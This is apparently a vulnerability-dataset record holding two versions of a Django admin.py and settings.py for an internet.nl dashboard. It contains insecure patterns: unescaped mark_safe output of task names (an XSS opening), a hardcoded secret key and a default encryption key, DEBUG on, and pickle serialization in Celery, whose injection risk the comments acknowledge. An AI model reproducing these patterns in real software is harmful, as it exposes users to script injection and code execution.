    list_display = ('name_safe', 'enabled', 'interval', 'crontab', 'next',  'due',
                    'precise', 'last_run_at', 'queue', 'task', 'args', 'last_run', 'runs')

    list_filter = ('enabled', 'queue', 'crontab')

    search_fields = ('name', 'queue', 'args')

    form = MyPeriodicTaskForm

    save_as = True

    @staticmethod
    def name_safe(obj):
        return mark_safe(obj.name)

    @staticmethod
    def last_run(obj):
        return obj.last_run_at

    @staticmethod
    def runs(obj):
        # print(dir(obj))
        return obj.total_run_count

    @staticmethod
    def due(obj):
        if obj.last_run_at:
            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)
        else:
            # y in seconds
            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))
            date = datetime.now(pytz.utc) + timedelta(seconds=y)

            return naturaltime(date)

    @staticmethod
    def precise(obj):
        if obj.last_run_at:
            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)
        else:
            return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc))

    @staticmethod
    def next(obj):
        if obj.last_run_at:
            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)
        else:
            # y in seconds
            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))
            # somehow the cron jobs still give the correct countdown even last_run_at is not set.

            date = datetime.now(pytz.utc) + timedelta(seconds=y)

            return date

    class Meta:
        ordering = [""-name""]


class IECrontabSchedule(ImportExportModelAdmin):
    pass


admin.site.unregister(PeriodicTask)
admin.site.unregister(CrontabSchedule)
admin.site.register(PeriodicTask, IEPeriodicTaskAdmin)
admin.site.register(CrontabSchedule, IECrontabSchedule)


class DashboardUserInline(admin.StackedInline):
    model = DashboardUser
    can_delete = False
    verbose_name_plural = 'Dashboard Users'


# Thank you:
# https://stackoverflow.com/questions/47941038/how-should-i-add-django-import-export-on-the-user-model?rq=1
class UserResource(resources.ModelResource):
    class Meta:
        model = User
        # fields = ('first_name', 'last_name', 'email')


class GroupResource(resources.ModelResource):
    class Meta:
        model = Group


class UserAdmin(BaseUserAdmin, ImportExportModelAdmin):
    resource_class = UserResource
    inlines = (DashboardUserInline, )

    list_display = ('username', 'first_name', 'last_name',
                    'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups')

    actions = []

    @staticmethod
    def in_groups(obj):
        value = """"
        for group in obj.groups.all():
            value += group.name
        return value


# I don't know if the permissions between two systems have the same numbers... Only one way to find out :)
class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin):
    resource_class = GroupResource


admin.site.unregister(User)
admin.site.register(User, UserAdmin)
admin.site.unregister(Group)
admin.site.register(Group, GroupAdmin)


# todo: make sure this is implemented.
# Overwrite the ugly Constance forms with something nicer
class CustomConfigForm(ConstanceForm):
    def __init__(self, *args, **kwargs):
        super(CustomConfigForm, self).__init__(*args, **kwargs)
        # ... do stuff to make your settings form nice ...


class ConfigAdmin(ConstanceAdmin):
    change_list_form = CustomConfigForm
    change_list_template = 'admin/config/settings.html'


admin.site.unregister([Config])
admin.site.register([Config], ConfigAdmin)


@admin.register(Account)
class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin):

    list_display = ('name', 'enable_logins', 'internet_nl_api_username')
    search_fields = ('name', )
    list_filter = ['enable_logins'][::-1]
    fields = ('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password')

    def save_model(self, request, obj, form, change):

        # If the internet_nl_api_password changed, encrypt the new value.
        # Example usage and docs: https://github.com/pyca/cryptography
        if 'internet_nl_api_password' in form.changed_data:
            f = Fernet(settings.FIELD_ENCRYPTION_KEY)
            encrypted = f.encrypt(obj.internet_nl_api_password.encode())
            obj.internet_nl_api_password = encrypted

            # You can decrypt using f.decrypt(token)

        super().save_model(request, obj, form, change)

    actions = []


@admin.register(UrlList)
class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):

    list_display = ('name', 'account', )
    search_fields = ('name', 'account__name')
    list_filter = ['account'][::-1]
    fields = ('name', 'account', 'urls')


@admin.register(UploadLog)
class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):
    list_display = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')
    search_fields = ('internal_filename', 'orginal_filename', 'status')
    list_filter = ['message', 'upload_date', 'user'][::-1]

    fields = ('original_filename', 'internal_filename', 'status', 'message', 'user', 'upload_date', 'filesize')
/n/n/ndashboard/settings.py/n/n""""""
Django settings for dashboard project.

Generated by 'django-admin startproject' using Django 2.1.7.

For more information on this file, see
https://docs.djangoproject.com/en/2.1/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/2.1/ref/settings/
""""""

import os
from datetime import timedelta

from django.utils.translation import gettext_lazy as _

# Build paths inside the project like this: os.path.join(BASE_DIR, ...)
# BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SETTINGS_PATH = os.path.normpath(os.path.dirname(__file__))

# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/2.1/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = '_dzlo^9d#ox6!7c9rju@=u8+4^sprqocy3s*l*ejc2yr34@&98'

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True

ALLOWED_HOSTS = []


# Application definition

INSTALLED_APPS = [
    # Constance
    'constance',
    'constance.backends.database',

    # Jet
    'jet.dashboard',
    'jet',

    # Import Export
    'import_export',

    # Standard Django
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'django.contrib.humanize',

    # Periodic tasks
    'django_celery_beat',

    # Javascript and CSS compression:
    'compressor',

    # Web Security Map (todo: minimize the subset)
    # The reason (model) why it's included is in the comments.
    'websecmap.app',  # Job
    'websecmap.organizations',  # Url
    'websecmap.scanners',  # Endpoint, EndpointGenericScan, UrlGenericScan
    'websecmap.reporting',  # Various reporting functions (might be not needed)
    'websecmap.map',  # because some scanners are intertwined with map configurations. That needs to go.
    'websecmap.pro',  # some model inlines

    # Custom Apps
    # These apps overwrite whatever is declared above, for example the user information.
    'dashboard.internet_nl_dashboard',

    # Two factor auth
    'django_otp',
    'django_otp.plugins.otp_static',
    'django_otp.plugins.otp_totp',
    'two_factor',
]

try:
    # hack to disable django_uwsgi app as it currently conflicts with compressor
    # https://github.com/django-compressor/django-compressor/issues/881
    if not os.environ.get('COMPRESS', False):
        import django_uwsgi  # NOQA

        INSTALLED_APPS += ['django_uwsgi', ]
except ImportError:
    # only configure uwsgi app if installed (ie: production environment)
    pass

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.locale.LocaleMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',

    # Two factor Auth
    'django_otp.middleware.OTPMiddleware',
]

ROOT_URLCONF = 'dashboard.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [
            BASE_DIR + '/',
        ],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'constance.context_processors.config',
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'dashboard.wsgi.application'


# Database
# https://docs.djangoproject.com/en/2.1/ref/settings/#databases

DATABASE_OPTIONS = {
    'mysql': {'init_command': ""SET character_set_connection=utf8,""
                              ""collation_connection=utf8_unicode_ci,""
                              ""sql_mode='STRICT_ALL_TABLES';""},
}
DB_ENGINE = os.environ.get('DB_ENGINE', 'mysql')
DATABASE_ENGINES = {
    'mysql': 'dashboard.app.backends.mysql',
}
DATABASES_SETTINGS = {
    # persisten local database used during development (runserver)
    'dev': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),
    },
    # sqlite memory database for running tests without
    'test': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),
    },
    # for production get database settings from environment (eg: docker)
    'production': {
        'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' + DB_ENGINE),
        'NAME': os.environ.get('DB_NAME', 'dashboard'),
        'USER': os.environ.get('DB_USER', 'dashboard'),
        'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'),
        'HOST': os.environ.get('DB_HOST', 'mysql'),
        'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'), {})
    }
}
# allow database to be selected through environment variables
DATABASE = os.environ.get('DJANGO_DATABASE', 'dev')
DATABASES = {'default': DATABASES_SETTINGS[DATABASE]}


# Password validation
# https://docs.djangoproject.com/en/2.1/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]


# Internationalization
# https://docs.djangoproject.com/en/2.1/topics/i18n/

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_L10N = True

USE_TZ = True

LOCALE_PATHS = ['locale']

LANGUAGE_COOKIE_NAME = 'dashboard_language'


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/2.1/howto/static-files/

STATIC_URL = '/static/'

# Absolute path to aggregate to and serve static file from.
if DEBUG:
    STATIC_ROOT = 'static'
else:
    STATIC_ROOT = '/srv/dashboard/static/'


JET_SIDE_MENU_ITEMS = [

    {'label': _(' Configuration'), 'items': [
        {'name': 'auth.user'},
        {'name': 'auth.group'},
        {'name': 'constance.config', 'label': _('Configuration')},
    ]},

    {'label': _(' Dashboard'), 'items': [
        {'name': 'internet_nl_dashboard.account'},
        {'name': 'internet_nl_dashboard.urllist'},
        {'name': 'internet_nl_dashboard.uploadlog'},
    ]},

    {'label': _(' Periodic Tasks'), 'items': [
        {'name': 'app.job'},
        {'name': 'django_celery_beat.periodictask'},
        {'name': 'django_celery_beat.crontabschedule'},
    ]},

]

MEDIA_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')
UPLOAD_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')


# Two factor auth
LOGIN_URL = ""two_factor:login""
LOGIN_REDIRECT_URL = ""/dashboard/""
LOGOUT_REDIRECT_URL = LOGIN_URL
TWO_FACTOR_QR_FACTORY = 'qrcode.image.pil.PilImage'
# 6 supports google authenticator
TWO_FACTOR_TOTP_DIGITS = 6
TWO_FACTOR_PATCH_ADMIN = True

# Encrypted fields
# Note that this key is not stored in the database. As... well if you have the database, you have the key.
FIELD_ENCRYPTION_KEY = os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=')

if not DEBUG and FIELD_ENCRYPTION_KEY == b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=':
    raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the '
                     'default key provided. Please create a new key. Instructions are listed here:'
                     'https://github.com/pyca/cryptography. In short, run: key = Fernet.generate_key()')

LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'console': {
            'class': 'logging.StreamHandler',  # sys.stdout
            'formatter': 'color',
        },
    },
    'formatters': {
        'debug': {
            'format': '%(asctime)s\t%(levelname)-8s - %(filename)-20s:%(lineno)-4s - '
                      '%(funcName)20s() - %(message)s',
        },
        'color': {
            '()': 'colorlog.ColoredFormatter',
            'format': '%(log_color)s%(asctime)s\t%(levelname)-8s - '
                      '%(message)s',
            'datefmt': '%Y-%m-%d %H:%M',
            'log_colors': {
                'DEBUG': 'green',
                'INFO': 'white',
                'WARNING': 'yellow',
                'ERROR': 'red',
                'CRITICAL': 'bold_red',
            },
        }
    },
    'loggers': {
        # Used when there is no log defined or loaded. Disabled given we always use __package__ to log.
        # Would you enable it, all logging messages will be logged twice.
        # '': {
        #     'handlers': ['console'],
        #     'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),
        # },

        # Default Django logging, we expect django to work, and therefore only show INFO messages.
        # It can be smart to sometimes want to see what's going on here, but not all the time.
        # https://docs.djangoproject.com/en/2.1/topics/logging/#django-s-logging-extensions
        'django': {
            'handlers': ['console'],
            'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'),
        },

        # We expect to be able to debug websecmap all of the time.
        'dashboard': {
            'handlers': ['console'],
            'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),
        },
    },
}


# settings to get WebSecMap to work:
# Celery 4.0 settings
# Pickle can work, but you need to use certificates to communicate (to verify the right origin)
# It's preferable not to use pickle, yet it's overly convenient as the normal serializer can not
# even serialize dicts.
# http://docs.celeryproject.org/en/latest/userguide/configuration.html
CELERY_accept_content = ['pickle', 'yaml']
CELERY_task_serializer = 'pickle'
CELERY_result_serializer = 'pickle'


# Celery config
CELERY_BROKER_URL = os.environ.get('BROKER', 'redis://localhost:6379/0')
ENABLE_UTC = True

# Any data transfered with pickle needs to be over tls... you can inject arbitrary objects with
# this stuff... message signing makes it a bit better, not perfect as it peels the onion.
# this stuff... message signing makes it a bit better, not perfect as it peels the onion.
# see: https://blog.nelhage.com/2011/03/exploiting-pickle/
# Yet pickle is the only convenient way of transporting objects without having to lean in all kinds
# of directions to get the job done. Intermediate tables to store results could be an option.
CELERY_ACCEPT_CONTENT = ['pickle']
CELERY_TASK_SERIALIZER = 'pickle'
CELERY_RESULT_SERIALIZER = 'pickle'
CELERY_TIMEZONE = 'UTC'

CELERY_BEAT_SCHEDULER = 'django_celery_beat.schedulers:DatabaseScheduler'

CELERY_BROKER_CONNECTION_MAX_RETRIES = 1
CELERY_BROKER_CONNECTION_RETRY = False
CELERY_RESULT_EXPIRES = timedelta(hours=4)

# Use the value of 2 for celery prefetch multiplier. Previous was 1. The
# assumption is that 1 will block a worker thread until the current (rate
# limited) task is completed. When using 2 (or higher) the assumption is that
# celery will drop further rate limited task from the internal worker queue and
# fetch other tasks tasks that could be executed (spooling other rate limited
# tasks through in the process but to no hard except for a slight drop in
# overall throughput/performance). A to high value for the prefetch multiplier
# might result in high priority tasks not being picked up as Celery does not
# seem to do prioritisation in worker queues but only on the broker
# queues. The value of 2 is currently selected because it higher than 1,
# behaviour needs to be observed to decide if raising this results in
# further improvements without impacting the priority feature.
CELERY_WORKER_PREFETCH_MULTIPLIER = 2

# numer of tasks to be executed in parallel by celery
CELERY_WORKER_CONCURRENCY = 10

# Workers will scale up and scale down depending on the number of tasks
# available. To prevent workers from scaling down while still doing work,
# the ACKS_LATE setting is used. This insures that a task is removed from
# the task queue after the task is performed. This might result in some
# issues where tasks that don't finish or crash keep being executed:
# thus for tasks that are not programmed perfectly it will raise a number
# of repeated exceptions which will need to be debugged.
CELERY_ACKS_LATE = True

TOOLS = {
    'organizations': {
        'import_data_dir': '',
    },
}

OUTPUT_DIR = os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) + '/')
VENDOR_DIR = os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) + '/../vendor/') + '/')

if DEBUG:
    # too many sql variables....
    DATA_UPLOAD_MAX_NUMBER_FIELDS = 10000


# Compression
# Django-compressor is used to compress css and js files in production
# During development this is disabled as it does not provide any feature there
# Django-compressor configuration defaults take care of this.
# https://django-compressor.readthedocs.io/en/latest/usage/
# which plugins to use to find static files
STATICFILES_FINDERS = (
    # default static files finders
    'django.contrib.staticfiles.finders.FileSystemFinder',
    'django.contrib.staticfiles.finders.AppDirectoriesFinder',
    # other finders..
    'compressor.finders.CompressorFinder',
)

COMPRESS_CSS_FILTERS = ['compressor.filters.cssmin.CSSCompressorFilter']

# Slimit doesn't work with vue. Tried two versions. Had to rewrite some other stuff.
# Now using the default, so not explicitly adding that to the settings
# COMPRESS_JS_FILTERS = ['compressor.filters.jsmin.JSMinFilter']

# Brotli compress storage gives some issues.
# This creates the original compressed and a gzipped compressed file.
COMPRESS_STORAGE = (
    'compressor.storage.GzipCompressorFileStorage'
)

# Enable static file (js/css) compression when not running debug
# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_OFFLINE
COMPRESS_OFFLINE = not DEBUG
# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_ENABLED
# Enabled when debug is off by default.
/n/n/n",0
103,9c1c17e55e436e0f6a5f7271c39d77d8a6890738,"/dashboard/internet_nl_dashboard/admin.py/n/nfrom datetime import datetime, timedelta

import pytz
from constance.admin import Config, ConstanceAdmin, ConstanceForm
from cryptography.fernet import Fernet
from django.conf import settings
from django.contrib import admin
from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin
from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
from django.contrib.auth.models import Group, User
from django.contrib.humanize.templatetags.humanize import naturaltime
from django.utils.safestring import mark_safe
from django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm
from django_celery_beat.models import CrontabSchedule, PeriodicTask
from import_export import resources
from import_export.admin import ImportExportModelAdmin

from dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList


class MyPeriodicTaskForm(PeriodicTaskForm):

    fieldsets = PeriodicTaskAdmin.fieldsets

    """"""
    Interval schedule does not support due_ or something. Which is absolutely terrible and vague.
    I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy
    when something will run.

    Because of this, we'll move to the horrifically designed absolute nightmare format Crontab.
    Crontab would be half-great if the parameters where named.

    Get your crontab guru going, this is the only way you'll understand what you're doing.
    https://crontab.guru/#0_21_*_*_*
    """"""

    def clean(self):
        print('cleaning')

        cleaned_data = super(PeriodicTaskForm, self).clean()

        # if not self.cleaned_data['last_run_at']:
        #     self.cleaned_data['last_run_at'] = datetime.now(pytz.utc)

        return cleaned_data


class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin):
    # most / all time schedule functions in celery beat are moot. So the code below likely makes no sense.

    list_display = ('name_safe', 'enabled', 'interval', 'crontab', 'next',  'due',
                    'precise', 'last_run_at', 'queue', 'task', 'args', 'last_run', 'runs')

    list_filter = ('enabled', 'queue', 'crontab')

    search_fields = ('name', 'queue', 'args')

    form = MyPeriodicTaskForm

    save_as = True

    @staticmethod
    def name_safe(obj):
        return mark_safe(obj.name)

    @staticmethod
    def last_run(obj):
        return obj.last_run_at

    @staticmethod
    def runs(obj):
        # print(dir(obj))
        return obj.total_run_count

    @staticmethod
    def due(obj):
        if obj.last_run_at:
            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)
        else:
            # y in seconds
            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))
            date = datetime.now(pytz.utc) + timedelta(seconds=y)

            return naturaltime(date)

    @staticmethod
    def precise(obj):
        if obj.last_run_at:
            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)
        else:
            return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc))

    @staticmethod
    def next(obj):
        if obj.last_run_at:
            return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at)
        else:
            # y in seconds
            z, y = obj.schedule.is_due(last_run_at=datetime.now(pytz.utc))
            # somehow the cron jobs still give the correct countdown even last_run_at is not set.

            date = datetime.now(pytz.utc) + timedelta(seconds=y)

            return date

    class Meta:
        ordering = [""-name""]


class IECrontabSchedule(ImportExportModelAdmin):
    pass


admin.site.unregister(PeriodicTask)
admin.site.unregister(CrontabSchedule)
admin.site.register(PeriodicTask, IEPeriodicTaskAdmin)
admin.site.register(CrontabSchedule, IECrontabSchedule)


class DashboardUserInline(admin.StackedInline):
    model = DashboardUser
    can_delete = False
    verbose_name_plural = 'Dashboard Users'


# Thank you:
# https://stackoverflow.com/questions/47941038/how-should-i-add-django-import-export-on-the-user-model?rq=1
class UserResource(resources.ModelResource):
    class Meta:
        model = User
        # fields = ('first_name', 'last_name', 'email')


class GroupResource(resources.ModelResource):
    class Meta:
        model = Group


class UserAdmin(BaseUserAdmin, ImportExportModelAdmin):
    resource_class = UserResource
    inlines = (DashboardUserInline, )

    list_display = ('username', 'first_name', 'last_name',
                    'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups')

    actions = []

    @staticmethod
    def in_groups(obj):
        value = """"
        for group in obj.groups.all():
            value += group.name
        return value


# I don't know if the permissions between two systems have the same numbers... Only one way to find out :)
class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin):
    resource_class = GroupResource


admin.site.unregister(User)
admin.site.register(User, UserAdmin)
admin.site.unregister(Group)
admin.site.register(Group, GroupAdmin)


# todo: make sure this is implemented.
# Overwrite the ugly Constance forms with something nicer
class CustomConfigForm(ConstanceForm):
    def __init__(self, *args, **kwargs):
        super(CustomConfigForm, self).__init__(*args, **kwargs)
        # ... do stuff to make your settings form nice ...


class ConfigAdmin(ConstanceAdmin):
    change_list_form = CustomConfigForm
    change_list_template = 'admin/config/settings.html'


admin.site.unregister([Config])
admin.site.register([Config], ConfigAdmin)


@admin.register(Account)
class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin):

    list_display = ('name', 'enable_logins', 'internet_nl_api_username')
    search_fields = ('name', )
    list_filter = ['enable_logins'][::-1]
    fields = ('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password')

    def save_model(self, request, obj, form, change):

        # If the internet_nl_api_password changed, encrypt the new value.
        # Example usage and docs: https://github.com/pyca/cryptography
        if 'internet_nl_api_password' in form.changed_data:
            f = Fernet(settings.FIELD_ENCRYPTION_KEY)
            encrypted = f.encrypt(obj.internet_nl_api_password.encode())
            obj.internet_nl_api_password = encrypted

            # You can decrypt using f.decrypt(token)

        super().save_model(request, obj, form, change)

    actions = []


@admin.register(UrlList)
class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin):

    list_display = ('name', 'account', )
    search_fields = ('name', 'account__name')
    list_filter = ['account'][::-1]
    fields = ('name', 'account', 'urls')


@admin.register(UploadLog)
class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin):
    list_display = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')
    search_fields = ('internal_filename', 'orginal_filename', 'message')
    list_filter = ['message', 'upload_date', 'user'][::-1]

    fields = ('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize')
/n/n/n/dashboard/settings.py/n/n""""""
Django settings for dashboard project.

Generated by 'django-admin startproject' using Django 2.1.7.

For more information on this file, see
https://docs.djangoproject.com/en/2.1/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/2.1/ref/settings/
""""""

import os
from datetime import timedelta

from django.utils.translation import gettext_lazy as _

# Build paths inside the project like this: os.path.join(BASE_DIR, ...)
# BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SETTINGS_PATH = os.path.normpath(os.path.dirname(__file__))

# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/2.1/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = '_dzlo^9d#ox6!7c9rju@=u8+4^sprqocy3s*l*ejc2yr34@&98'

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True

ALLOWED_HOSTS = []


# Application definition

INSTALLED_APPS = [
    # Constance
    'constance',
    'constance.backends.database',

    # Jet
    'jet.dashboard',
    'jet',

    # Import Export
    'import_export',

    # Standard Django
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'django.contrib.humanize',

    # Periodic tasks
    'django_celery_beat',

    # Javascript and CSS compression:
    'compressor',

    # Web Security Map (todo: minimize the subset)
    # The reason (model) why it's included is in the comments.
    'websecmap.app',  # Job
    'websecmap.organizations',  # Url
    'websecmap.scanners',  # Endpoint, EndpointGenericScan, UrlGenericScan
    'websecmap.reporting',  # Various reporting functions (might be not needed)
    'websecmap.map',  # because some scanners are intertwined with map configurations. That needs to go.
    'websecmap.pro',  # some model inlines

    # Custom Apps
    # These apps overwrite whatever is declared above, for example the user information.
    'dashboard.internet_nl_dashboard',

    # Two factor auth
    'django_otp',
    'django_otp.plugins.otp_static',
    'django_otp.plugins.otp_totp',
    'two_factor',
]

try:
    # hack to disable django_uwsgi app as it currently conflicts with compressor
    # https://github.com/django-compressor/django-compressor/issues/881
    if not os.environ.get('COMPRESS', False):
        import django_uwsgi  # NOQA

        INSTALLED_APPS += ['django_uwsgi', ]
except ImportError:
    # only configure uwsgi app if installed (ie: production environment)
    pass

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.locale.LocaleMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',

    # Two factor Auth
    'django_otp.middleware.OTPMiddleware',
]

ROOT_URLCONF = 'dashboard.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [
            BASE_DIR + '/',
        ],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'constance.context_processors.config',
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'dashboard.wsgi.application'


# Database
# https://docs.djangoproject.com/en/2.1/ref/settings/#databases

DATABASE_OPTIONS = {
    'mysql': {'init_command': ""SET character_set_connection=utf8,""
                              ""collation_connection=utf8_unicode_ci,""
                              ""sql_mode='STRICT_ALL_TABLES';""},
}
DB_ENGINE = os.environ.get('DB_ENGINE', 'mysql')
DATABASE_ENGINES = {
    'mysql': 'dashboard.app.backends.mysql',
}
DATABASES_SETTINGS = {
    # persisten local database used during development (runserver)
    'dev': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),
    },
    # sqlite memory database for running tests without
    'test': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': os.environ.get('DB_NAME', 'db.sqlite3'),
    },
    # for production get database settings from environment (eg: docker)
    'production': {
        'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' + DB_ENGINE),
        'NAME': os.environ.get('DB_NAME', 'dashboard'),
        'USER': os.environ.get('DB_USER', 'dashboard'),
        'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'),
        'HOST': os.environ.get('DB_HOST', 'mysql'),
        'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'), {})
    }
}
# allow database to be selected through environment variables
DATABASE = os.environ.get('DJANGO_DATABASE', 'dev')
DATABASES = {'default': DATABASES_SETTINGS[DATABASE]}


# Password validation
# https://docs.djangoproject.com/en/2.1/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]


# Internationalization
# https://docs.djangoproject.com/en/2.1/topics/i18n/

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_L10N = True

USE_TZ = True

LOCALE_PATHS = ['locale']

LANGUAGE_COOKIE_NAME = 'dashboard_language'


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/2.1/howto/static-files/

STATIC_URL = '/static/'

# Absolute path to aggregate to and serve static file from.
if DEBUG:
    STATIC_ROOT = 'static'
else:
    STATIC_ROOT = '/srv/dashboard/static/'


JET_SIDE_MENU_ITEMS = [

    {'label': _(' Configuration'), 'items': [
        {'name': 'auth.user'},
        {'name': 'auth.group'},
        {'name': 'constance.config', 'label': _('Configuration')},
    ]},

    {'label': _('Dashboard'), 'items': [
        {'name': 'internet_nl_dashboard.account'},
        {'name': 'internet_nl_dashboard.urllist'},
        {'name': 'internet_nl_dashboard.uploadlog'},
    ]},

    {'label': _(' Periodic Tasks'), 'items': [
        {'name': 'app.job'},
        {'name': 'django_celery_beat.periodictask'},
        {'name': 'django_celery_beat.crontabschedule'},
    ]},

]

MEDIA_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')
UPLOAD_ROOT = os.environ.get('MEDIA_ROOT', os.path.abspath(os.path.dirname(__file__)) + '/uploads/')


# Two factor auth
LOGIN_URL = ""two_factor:login""
LOGIN_REDIRECT_URL = ""/dashboard/""
LOGOUT_REDIRECT_URL = LOGIN_URL
TWO_FACTOR_QR_FACTORY = 'qrcode.image.pil.PilImage'
# 6 supports google authenticator
TWO_FACTOR_TOTP_DIGITS = 6
TWO_FACTOR_PATCH_ADMIN = True

